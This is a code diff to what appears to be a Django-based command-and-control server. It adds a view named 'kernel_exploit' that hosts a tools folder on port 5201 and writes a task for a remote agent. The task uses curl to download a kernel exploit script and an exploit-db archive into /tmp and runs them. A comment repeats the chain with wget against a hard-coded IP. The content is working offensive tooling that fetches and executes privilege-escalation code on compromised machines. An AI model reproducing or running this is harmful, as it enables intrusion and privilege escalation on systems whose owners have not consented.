@@ -641,3 +641,27 @@ def Linuxdownload(request):
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
+
+#automated kernel exploit module
+def kernel_exploit(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        os.system("timeout 60 python -m http.server 5201 --directory {} & ".format(tools_path))
+        
+        task= 'curl -o /tmp/kernel_exploit.sh http://{0}:5201/Exploitation/linux/kernel_exploit.sh;curl -o /tmp/exploitdb.zip http://{0}:5201/Exploitation/linux/exploitdb-main.zip;chmod +x /tmp/kernel_exploit.sh;bash /tmp/kernel_exploit.sh'.format(ip,tools_path)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+    
+    #wget http://192.168.100.8:5201/Exploitation/linux/kernel_exploit.sh -O /tmp/kernel_exploit.sh;wget http://192.168.100.8:5201/Exploitation/linux/exploitdb-main.zip -O /tmp/exploitdb.zip;chmod +x /tmp/kernel_exploit.sh;bash /tmp/kernel_exploit.sh
